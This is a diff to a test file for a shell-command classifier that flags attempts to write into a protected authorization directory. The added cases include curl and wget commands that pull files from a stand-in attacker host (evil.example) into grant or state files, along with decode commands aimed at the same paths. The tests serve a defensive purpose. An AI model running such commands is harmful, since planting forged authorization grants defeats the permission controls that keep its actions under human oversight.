@@ -233,8 +233,11 @@ describe("classifyShellAuthzOps (#2944)", () => {
       "curl --output .deft/authz/grants/evil.json https://evil.example/g.json",
       "curl --output=.deft/authz/grants/evil.json https://evil.example/g.json",
       "curl -o.deft/authz/grants/evil.json https://evil.example/g.json",
+      "curl --output-dir .deft/authz/grants -O https://evil.example/g.json",
       "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
       "wget --output-document=.deft/authz/state.json https://evil.example/s.json",
+      "wget -P .deft/authz/grants https://evil.example/g.json",
+      "wget --directory-prefix=.deft/authz https://evil.example/g.json",
       "xxd -r - .deft/authz/grants/evil.json",
       "openssl base64 -d -out .deft/authz/grants/evil.json",
       "openssl base64 -d -out=.deft/authz/grants/evil.json",
@@ -260,6 +263,11 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("curl -o /tmp/out https://example.com/a")).toEqual([]);
     expect(classifyShellAuthzOps("wget -O /tmp/out https://example.com/a")).toEqual([]);
     expect(classifyShellAuthzOps("curl $URL")).toEqual([]);
+    // Read-only dumps / -in paths are not settings (Greptile P1 residual).
+    expect(classifyShellAuthzOps("xxd .deft/authz/state.json")).toEqual([]);
+    expect(classifyShellAuthzOps("openssl base64 -d -in .deft/authz/state.json")).toEqual([]);
+    // Path-like operand named like a bin must not skip xxd -r dest (SLizard).
+    expect(classifyShellAuthzOps("xxd -r - .deft/authz/grants/./wget")).toContain("settings");
     // Literal redirect kill-switch regression (#3186) still settings.
     expect(classifyShellAuthzOps("echo > .deft-directive-disable")).toContain("settings");
   });
